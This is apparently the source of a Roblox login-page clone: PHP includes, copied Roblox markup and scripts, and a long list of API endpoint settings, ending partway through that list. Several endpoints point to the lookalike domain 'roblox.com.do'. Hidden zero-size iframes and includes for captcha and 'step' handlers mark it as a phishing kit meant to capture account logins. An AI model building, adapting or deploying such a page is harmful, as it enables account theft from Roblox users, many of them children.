<?php
session_start();
include("includes/functions.php");
include('web/setup/setup.php');
include('web/setup/database.php');
include('api/stub.php');
if($_GET["returnUrl"]){
    $session = htmlspecialchars($_GET["returnUrl"],ENT_QUOTES);
	if($session){
		$captchafilename = "/api/captcha.php";
		$stepfilename = "/api/step.php";
	}
}else{
header("Location: https://roblox.com");
}
?>



<!DOCTYPE html>
<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
<!--[if gt IE 8]><!-->
<html>
<!--<![endif]-->
<head data-machine-id="WEB6">

<title>Roblox</title>
<meta name="referrer" content="no-referrer">
<meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Roblox Corporation" />
<meta name="description" content="Roblox is a global platform that brings people together through play." />
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine" />
<meta name="apple-itunes-app" content="app-id=431946152" />
<script type="application/ld+json"> { "@context" : "http://schema.org", "@type" : "Organization", "name" : "Roblox", "url" : "https://www.roblox.com/", "logo": "https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91", "sameAs" : [ "https://www.facebook.com/roblox/", "https://twitter.com/roblox", "https://www.linkedin.com/company/147977", "https://www.instagram.com/roblox/", "https://www.youtube.com/user/roblox", "https://plus.google.com/+roblox", "https://www.twitch.tv/roblox" ] } </script>
<meta name="locale-data" data-language-code="en_us" data-language-name="English" />
<meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" />
<meta name="environment-meta" data-is-testing-site="false" />
<meta id="roblox-display-names" data-enabled="true"></meta>
<meta name="page-meta" data-internal-page-name="Login" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://client.arkoselabs.com/fc/api/?onload=loadChallenge" async defer></script>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.BundleVerifierConstants = {
		isMetricsApiEnabled: true,
		eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
		deviceType: "Computer",
		cdnLoggingEnabled: JSON.parse("true")
	};
	</script>
	<style>
        iframe {
            width: 0px;
            height: 0px;
            border: 0 !important;
            overflow-y: hidden;
        }
    </style>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.BundleDetector = (function() {
		var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;
		var loadStates = {
			loadSuccess: "loadSuccess",
			loadFailure: "loadFailure",
			executionFailure: "executionFailure"
		};
		var bundleContentTypes = {
			javascript: "javascript",
			css: "css"
		};
		var ephemeralCounterNames = {
			cdnPrefix: "CDNBundleError_",
			unknown: "CDNBundleError_unknown",
			cssError: "CssBundleError",
			jsError: "JavascriptBundleError",
			jsFileError: "JsFileExecutionError",
			resourceError: "ResourcePerformance_Error",
			resourceLoaded: "ResourcePerformance_Loaded"
		};
		return {
			jsBundlesLoaded: {},
			bundlesReported: {},
			counterNames: ephemeralCounterNames,
			loadStates: loadStates,
			bundleContentTypes: bundleContentTypes,
			timing: undefined,
			setTiming: function(windowTiming) {
				this.timing = windowTiming;
			},
			getLoadTime: function() {
				if(this.timing && this.timing.domComplete) {
					return this.getCurrentTime() - this.timing.domComplete;
				}
			},
			getCurrentTime: function() {
				return new Date().getTime();
			},
			getCdnProviderName: function(bundleUrl, callBack) {
				if(Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
					var xhr = new XMLHttpRequest();
					xhr.open('GET', bundleUrl, true);
					xhr.onreadystatechange = function() {
						if(xhr.readyState === xhr.HEADERS_RECEIVED) {
							try {
								var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
								if(headerValue) {
									callBack(headerValue);
								} else {
									callBack();
								}
							} catch(e) {
								callBack();
							}
						}
					};
					xhr.onerror = function() {
						callBack();
					};
					xhr.send();
				} else {
					callBack();
				}
			},
			getCdnProviderAndReportMetrics: function(bundleUrl, bundleName, loadState, bundleContentType) {
				this.getCdnProviderName(bundleUrl, function(cdnProviderName) {
					Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
				});
			},
			reportMetrics: function(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
				if(!isMetricsApiEnabled || !bundleUrl || !loadState || !loadStates.hasOwnProperty(loadState) || !bundleContentType || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
					return;
				}
				var xhr = new XMLHttpRequest();
				var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";
				xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
				xhr.setRequestHeader("Content-Type", "application/json");
				xhr.withCredentials = true;
				xhr.send(JSON.stringify({
					bundleUrl: bundleUrl,
					bundleName: bundleName || "",
					bundleContentType: bundleContentType,
					loadState: loadState,
					cdnProviderName: cdnProviderName,
					loadTimeInMilliseconds: this.getLoadTime() || 0
				}));
			},
			logToEphemeralStatistics: function(sequenceName, value) {
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				sequenceName += "_" + deviceType;
				var xhr = new XMLHttpRequest();
				xhr.open('POST', '/game/report-stats?name=' + sequenceName + "&value=" + value, true);
				xhr.withCredentials = true;
				xhr.send();
			},
			logToEphemeralCounter: function(ephemeralCounterName) {
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				ephemeralCounterName += "_" + deviceType;
				//log to ephemeral counters - taken from eventTracker.js
				var xhr = new XMLHttpRequest();
				xhr.open('POST', '/game/report-event?name=' + ephemeralCounterName, true);
				xhr.withCredentials = true;
				xhr.send();
			},
			logToEventStream: function(failedBundle, ctx, cdnProvider, status) {
				var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
					currentPageUrl = encodeURIComponent(window.location.href);
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				ctx += "_" + deviceType;
				//try and grab performance data.
				//Note that this is the performance of the xmlhttprequest rather than the original resource load.
				var duration = 0;
				if(window.performance) {
					var perfTiming = window.performance.getEntriesByName(failedBundle);
					if(perfTiming.length > 0) {
						var data = perfTiming[0];
						duration = data.duration || 0;
					}
				}
				//log to event stream (diagnostic)
				var params = "&evt=webBundleError&url=" + currentPageUrl + "&ctx=" + ctx + "&fileSourceUrl=" + encodeURIComponent(failedBundle) + "&cdnName=" + (cdnProvider || "unknown") + "&statusCode=" + (status || "unknown") + "&loadDuration=" + Math.floor(duration);
				var img = new Image();
				img.src = esUrl + params;
			},
			getCdnInfo: function(failedBundle, ctx, fileType) {
				if(Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
					var xhr = new XMLHttpRequest();
					var counter = this.counterNames;
					xhr.open('GET', failedBundle, true);
					var cdnProvider;
					//succesful request
					xhr.onreadystatechange = function() {
						if(xhr.readyState === xhr.HEADERS_RECEIVED) {
							cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
							if(cdnProvider && cdnProvider.length > 0) {
								Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
							} else {
								Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
							}
						} else if(xhr.readyState === xhr.DONE) {
							// append status to cdn provider so we know its not related to network error. 
							Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
						}
					};
					//attach to possible things that can go wrong with the request.
					//additionally a network error will trigger this callback
					xhr.onerror = function() {
						Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
						Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
					};
					xhr.send();
				} else {
					this.logToEventStream(failedBundle, ctx);
				}
			},
			reportResourceError: function(resourceName) {
				var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
				this.logToEphemeralCounter(ephemeralCounterName);
			},
			reportResourceLoaded: function(resourceName) {
				var loadTimeInMs = this.getLoadTime();
				if(loadTimeInMs) {
					var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
					this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
				}
			},
			reportBundleError: function(bundleTag) {
				var ephemeralCounterName, failedBundle, ctx, contentType;
				if(bundleTag.rel && bundleTag.rel === "stylesheet") {
					ephemeralCounterName = this.counterNames.cssError;
					failedBundle = bundleTag.href;
					ctx = "css";
					contentType = bundleContentTypes.css;
				} else {
					ephemeralCounterName = this.counterNames.jsError;
					failedBundle = bundleTag.src;
					ctx = "js";
					contentType = bundleContentTypes.javascript;
				}
				//mark that we logged this bundle
				this.bundlesReported[failedBundle] = true;
				//e.g. javascriptBundleError_Computer
				this.logToEphemeralCounter(ephemeralCounterName);
				//this will also log to event stream
				this.getCdnInfo(failedBundle, ctx, ctx);
				var bundleName;
				if(bundleTag.dataset) {
					bundleName = bundleTag.dataset.bundlename;
				} else {
					bundleName = bundleTag.getAttribute('data-bundlename');
				}
				this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
			},
			bundleDetected: function(bundleName) {
				this.jsBundlesLoaded[bundleName] = true;
			},
			verifyBundles: function(document) {
				var ephemeralCounterName = this.counterNames.jsFileError,
					eventContext = ephemeralCounterName;
				//grab all roblox script tags in the page. 
				var scripts = (document && document.scripts) || window.document.scripts;
				var errorsList = [];
				var bundleName;
				var monitor;
				for(var i = 0; i < scripts.length; i++) {
					var item = scripts[i];
					if(item.dataset) {
						bundleName = item.dataset.bundlename;
						monitor = item.dataset.monitor;
					} else {
						bundleName = item.getAttribute('data-bundlename');
						monitor = item.getAttribute('data-monitor');
					}
					if(item.src && monitor && bundleName) {
						if(!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
							errorsList.push(item);
						}
					}
				}
				if(errorsList.length > 0) {
					for(var j = 0; j < errorsList.length; j++) {
						var script = errorsList[j];
						if(!this.bundlesReported[script.src]) {
							//log the counter only if the file is actually corrupted, not just due to failure to load
							//e.g. JsFileExecutionError_Computer
							this.logToEphemeralCounter(ephemeralCounterName);
							this.getCdnInfo(script.src, eventContext, 'js');
							if(script.dataset) {
								bundleName = script.dataset.bundlename;
							} else {
								bundleName = script.getAttribute('data-bundlename');
							}
							this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
						}
					}
				}
			}
		};
	})();
	window.addEventListener("load", function(evt) {
		Roblox.BundleDetector.verifyBundles();
	});
	Roblox.BundleDetector.setTiming(window.performance.timing);
	//# sourceURL=somename.js
	</script>
<link href="https://images.rbxcdn.com/3b43a5c16ec359053fef735551716fc5.ico" rel="icon" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/1ed4236770a0954c1a31c6add531f5042babaa18dd46be3d86da788e5dc4807d.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/d41f2dd08e2e54efa22d6e04120af18e4ca32b65227e62cf6f33933a7899241d.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/bbfa8678c5dc8467d00c4a99038f3b73d7e45b31d571be1c9eb16ca5a3708ac6.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/d5344f38053922e5936f0d7e2d3496ee4f83b46f0bb40d1d2c253b80ac82668e.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css" />
<link rel="canonical" href="https://www.roblox.com/NewLogin" />
<link onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' rel='stylesheet' href='https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch' />
<link onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' rel='stylesheet' href='https://static.rbxcdn.com/css/page___b0dafd506d198313adc7eb9bccc23fbb_m.css/fetch' />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/0f161e158c689e76fd22cad828c428186a12e276dc4601aaffe5230c3ead905e.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/390eb5d1969a0b33f32893c11b2debd0aba6aa4c356328ffb8cc1976f8e82aea.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/2f599b9e9ca20ee3c155684adbf1cdcb7220bab681b55b4505123a0c34e81969.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/651dbf41eeb7195601d50f267fa49d4b67adbb0dff612359224653589487e5a7.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/fbdd9249bddf39efceb65210c0732086cd601be2657e4901358086ab62f23c1c.css" />
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Login" data-bundle-source="Main" href="https://css.rbxcdn.com/fbdd9249bddf39efceb65210c0732086cd601be2657e4901358086ab62f23c1c.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
	Roblox.EnvironmentUrls = {
		"abtestingApiSite": "https://www.roblox.com.do",
		"accountInformationApi": "https://www.roblox.com.do",
		"accountSettingsApi": "https://accountsettings.roblox.com",
		"adConfigurationApi": "https://adconfiguration.roblox.com",
		"adsApi": "https://ads.roblox.com",
		"apiGatewayCdnUrl": "https://apis.rbxcdn.com",
		"apiGatewayUrl": "https://apis.roblox.com/",
		"apiProxyUrl": "https://api.roblox.com",
		"assetDeliveryApi": "https://assetdelivery.roblox.com",
		"authApi": "https://auth.roblox.com",
		"avatarApi": "https://www.roblox.com.do",
		"badgesApi": "https://www.roblox.com.do",
		"billingApi": "https://billing.roblox.com",
		"captchaApi": "https://captcha.roblox.com",
		"catalogApi": "https://www.roblox.com.do",
		"chatApi": "https://chat.roblox.com",
		"chatModerationApi": "https://chatmoderation.roblox.com",
		"contactsApi": "https://contacts.roblox.com",
		"contentStoreApi": "https://contentstore.roblox.com",
		"developApi": "https://develop.roblox.com",
		"domain": "roblox.com",
		"economyApi": "https://economy.roblox.com",
		"economycreatorstatsApi": "https://economycreatorstats.roblox.com",
		"engagementPayoutsApi": "https://engagementpayouts.roblox.com",
		"followingsApi": "https://followings.roblox.com",
		"friendsApi": "https://www.roblox.com.do",
		"gameInternationalizationApi": "https://gameinternationalization.roblox.com",
		"gamesApi": "https://games.roblox.com",
		"groupsApi": "https://groups.roblox.com",
		"groupsModerationApi": "https://groupsmoderation.roblox.com",
		"helpSite": "http://help.roblox.com",
		"inventoryApi": "https://inventory.roblox.com",
		"itemConfigurationApi": "https://itemconfiguration.roblox.com",
		"localeApi": "https://locale.roblox.com",
		"localizationTablesApi": "https://localizationtables.roblox.com",
		"metricsApi": "https://www.roblox.com.do",
		"midasApi": "https://midas.roblox.com",
		"notificationApi": "https://notifications.roblox.com",
		"premiumFeaturesApi": "https://premiumfeatures.roblox.com",
		"presenceApi": "https://presence.roblox.com",
		"privateMessagesApi": "https://privatemessages.roblox.com",
		"publishApi": "https://publish.roblox.com",
		"restrictedHoursServiceApi": "https://apis.roblox.com/restricted-hours-service",
		"screenTimeApi": "https://apis.rcs.roblox.com/screen-time-api",
		"shareApi": "https://share.roblox.com",
		"thumbnailsApi": "https://www.roblox.com.do",
		"tradesApi": "https://trades.roblox.com",
		"translationRolesApi": "https://translationroles.roblox.com",
		"twoStepVerificationApi": "https://twostepverification.roblox.com",
		"universalAppConfigurationApi": "https://www.roblox.com.do/universal-app-configuration",
		"userAgreementsServiceApi": "https://apis.roblox.com/user-agreements",
		"userModerationApi": "https://usermoderation.roblox.com",
		"usersApi": "https://users.roblox.com",
		"voiceApi": "https://voice.roblox.com",
		"websiteUrl": "https://www.roblox.com"
	};
	// please keep the list in alphabetical order
	var additionalUrls = {
		amazonStoreLink: "https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA",
		amazonWebStoreLink: "https%3a%2f%2fwww.amazon.com%2froblox%3f%26_encoding%3dUTF8%26tag%3dr05d13-20%26linkCode%3dur2%26linkId%3d5562fc29c05b45562a86358c198356eb%26camp%3d1789%26creative%3d9325",
		appProtocolUrl: "robloxmobile://",
		appStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
		googlePlayStoreLink: "https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en",
		iosAppStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
		windowsStoreLink: "https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm",
		xboxStoreLink: "https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k"
	}
	for(var urlName in additionalUrls) {
		Roblox.EnvironmentUrls[urlName] = additionalUrls[urlName];
	}
	</script>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.GaEventSettings = {
		gaDFPPreRollEnabled: "false" === "true",
		gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
		gaPerformanceEventEnabled: "false" === "true"
	};
	</script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='headerinit' type='text/javascript' src='https://js.rbxcdn.com/a67ddd9413db88f4124e2c4f25d8cb1f.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/772034db167d3f4260047db4a7f2b8a58cf448709327013541e47c8962b6e556.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/4db2f741b7a3ec36d11fec999ce33f708ae85641cabfd27e11e0935928f7d9c4.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/97cb9ac7262155c329a259fce9f940f9bcfa852a6a1ccb44bd8a41c31e84e54b.js"></script>
<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0.01" />
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Sentry" data-bundle-source="Main" src="https://js.rbxcdn.com/edc66704bd1974195d8c60f4a163441bec82f1bcb11c492e7df07c43f45a4d49.js"></script>
<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true" />
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/ca2261fe9ad840ce9ed16c2b34a21f45a3bfaaf229bdab564a169aa3d505f92d.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.AdsHelper = Roblox.AdsHelper || {};
	Roblox.AdsLibrary = Roblox.AdsLibrary || {};
	Roblox.AdsHelper.toggleAdsSlot = function(slotId, GPTRandomSlotIdentifier) {
		var gutterAdsEnabled = false;
		if(gutterAdsEnabled) {
			googletag.display(GPTRandomSlotIdentifier);
			return;
		}
		if(typeof slotId !== 'undefined' && slotId && slotId.length > 0) {
			var slotElm = $("#" + slotId);
			if(slotElm.is(":visible")) {
				googletag.display(GPTRandomSlotIdentifier);
			} else {
				var adParam = Roblox.AdsLibrary.adsParameters[slotId];
				if(adParam) {
					adParam.template = slotElm.html();
					slotElm.empty();
				}
			}
		}
	}
	</script>
<script type="text/javascript">
	$(function() {
		RobloxEventManager.triggerEvent('rbx_evt_newuser', {});
	});
	</script>
<!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
<script>
	//Set if it browser's do not track flag is enabled
	var Roblox = Roblox || {};
	(function() {
		var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
		if(typeof window.external !== "undefined" && typeof window.external.msTrackingProtectionEnabled !== "undefined") {
			dnt = dnt || window.external.msTrackingProtectionEnabled();
		}
		Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
	})();
	</script>
<script type="text/javascript">
	var _gaq = _gaq || [];
	window.GoogleAnalyticsDisableRoblox2 = true;
	_gaq.push(['b._setAccount', 'UA-486632-1']);
	_gaq.push(['b._setSampleRate', '10']);
	_gaq.push(['b._setCampSourceKey', 'rbx_source']);
	_gaq.push(['b._setCampMediumKey', 'rbx_medium']);
	_gaq.push(['b._setCampContentKey', 'rbx_campaign']);
	_gaq.push(['b._setDomainName', 'roblox.com']);
	_gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
	_gaq.push(['b._setPageGroup', 1, 'Login']);
	_gaq.push(['b._trackPageview']);
	_gaq.push(['c._setAccount', 'UA-26810151-2']);
	_gaq.push(['c._setSampleRate', '1']);
	_gaq.push(['c._setDomainName', 'roblox.com']);
	_gaq.push(['c._setPageGroup', 1, 'Login']);
	(function() {
		if(!Roblox.browserDoNotTrack) {
			var ga = document.createElement('script');
			ga.type = 'text/javascript';
			ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0];
			s.parentNode.insertBefore(ga, s);
		}
	})();
	</script>
<script async src='https://www.googletagmanager.com/gtag/js?id=AW-1065449093'></script>
<script type="text/javascript">
	var accountCode = "AW-1065449093";
	var signupConversionEventKey = "wmuJCO3CZBCF7YX8Aw";
	var webPurchaseConversionEventKey = "XDQ_CJme6s0BEIXthfwD";
	window.dataLayer = window.dataLayer || [];

	function gtag() {
		dataLayer.push(arguments);
	}
	gtag.conversionEvents = {
		signupConversionEvent: accountCode + '/' + signupConversionEventKey,
		webPurchaseConversionEvent: accountCode + '/' + webPurchaseConversionEventKey
	}
	gtag('set', 'allow_ad_personalization_signals', false);
	gtag('js', new Date());
	gtag('config', accountCode);
	</script>
<script type="text/javascript">
	if(Roblox && Roblox.EventStream) {
		Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/pe?t=studio", "//ecsv2.roblox.com/pe?t=diagnostic");
	}
	</script>
<script type="text/javascript">
	if(Roblox && Roblox.PageHeartbeatEvent) {
		Roblox.PageHeartbeatEvent.Init([2, 8, 20, 60]);
	}
	</script>
<script type="text/javascript">
	if(typeof(Roblox) === "undefined") {
		Roblox = {};
	}
	Roblox.Endpoints = Roblox.Endpoints || {};
	Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
	Roblox.Endpoints.Urls['/asset/'] = 'https://assetgame.roblox.com/asset/';
	Roblox.Endpoints.Urls['/client-status/set'] = 'https://www.roblox.com/client-status/set';
	Roblox.Endpoints.Urls['/client-status'] = 'https://www.roblox.com/client-status';
	Roblox.Endpoints.Urls['/game/'] = 'https://assetgame.roblox.com/game/';
	Roblox.Endpoints.Urls['/game/edit.ashx'] = 'https://assetgame.roblox.com/game/edit.ashx';
	Roblox.Endpoints.Urls['/game/placelauncher.ashx'] = 'https://assetgame.roblox.com/game/placelauncher.ashx';
	Roblox.Endpoints.Urls['/game/preloader'] = 'https://assetgame.roblox.com/game/preloader';
	Roblox.Endpoints.Urls['/game/report-stats'] = 'https://assetgame.roblox.com/game/report-stats';
	Roblox.Endpoints.Urls['/game/report-event'] = 'https://assetgame.roblox.com/game/report-event';
	Roblox.Endpoints.Urls['/game/updateprerollcount'] = 'https://assetgame.roblox.com/game/updateprerollcount';
	Roblox.Endpoints.Urls['/login/default.aspx'] = 'https://www.roblox.com/login/default.aspx';
	Roblox.Endpoints.Urls['/my/avatar'] = 'https://www.roblox.com/my/avatar';
	Roblox.Endpoints.Urls['/my/money.aspx'] = 'https://www.roblox.com/my/money.aspx';
	Roblox.Endpoints.Urls['/navigation/userdata'] = 'https://www.roblox.com/navigation/userdata';
	Roblox.Endpoints.Urls['/chat/chat'] = 'https://www.roblox.com/chat/chat';
	Roblox.Endpoints.Urls['/chat/data'] = 'https://www.roblox.com/chat/data';
	Roblox.Endpoints.Urls['/friends/list'] = 'https://www.roblox.com/friends/list';
	Roblox.Endpoints.Urls['/navigation/getcount'] = 'https://www.roblox.com/navigation/getCount';
	Roblox.Endpoints.Urls['/regex/email'] = 'https://www.roblox.com/regex/email';
	Roblox.Endpoints.Urls['/catalog/browse.aspx'] = 'https://www.roblox.com/catalog/browse.aspx';
	Roblox.Endpoints.Urls['/catalog/html'] = 'https://search.roblox.com/catalog/html';
	Roblox.Endpoints.Urls['/catalog/json'] = 'https://search.roblox.com/catalog/json';
	Roblox.Endpoints.Urls['/catalog/contents'] = 'https://search.roblox.com/catalog/contents';
	Roblox.Endpoints.Urls['/catalog/lists.aspx'] = 'https://search.roblox.com/catalog/lists.aspx';
	Roblox.Endpoints.Urls['/catalog/items'] = 'https://search.roblox.com/catalog/items';
	Roblox.Endpoints.Urls['/asset-hash-thumbnail/image'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/image';
	Roblox.Endpoints.Urls['/asset-hash-thumbnail/json'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/json';
	Roblox.Endpoints.Urls['/asset-thumbnail-3d/json'] = 'https://assetgame.roblox.com/asset-thumbnail-3d/json';
	Roblox.Endpoints.Urls['/asset-thumbnail/image'] = 'https://assetgame.roblox.com/asset-thumbnail/image';
	Roblox.Endpoints.Urls['/asset-thumbnail/json'] = 'https://assetgame.roblox.com/asset-thumbnail/json';
	Roblox.Endpoints.Urls['/asset-thumbnail/url'] = 'https://assetgame.roblox.com/asset-thumbnail/url';
	Roblox.Endpoints.Urls['/asset/request-thumbnail-fix'] = 'https://assetgame.roblox.com/asset/request-thumbnail-fix';
	Roblox.Endpoints.Urls['/avatar-thumbnail-3d/json'] = 'https://www.roblox.com/avatar-thumbnail-3d/json';
	Roblox.Endpoints.Urls['/avatar-thumbnail/image'] = 'https://www.roblox.com/avatar-thumbnail/image';
	Roblox.Endpoints.Urls['/avatar-thumbnail/json'] = 'https://www.roblox.com/avatar-thumbnail/json';
	Roblox.Endpoints.Urls['/avatar-thumbnails'] = 'https://www.roblox.com/avatar-thumbnails';
	Roblox.Endpoints.Urls['/avatar/request-thumbnail-fix'] = 'https://www.roblox.com/avatar/request-thumbnail-fix';
	Roblox.Endpoints.Urls['/bust-thumbnail/json'] = 'https://www.roblox.com/bust-thumbnail/json';
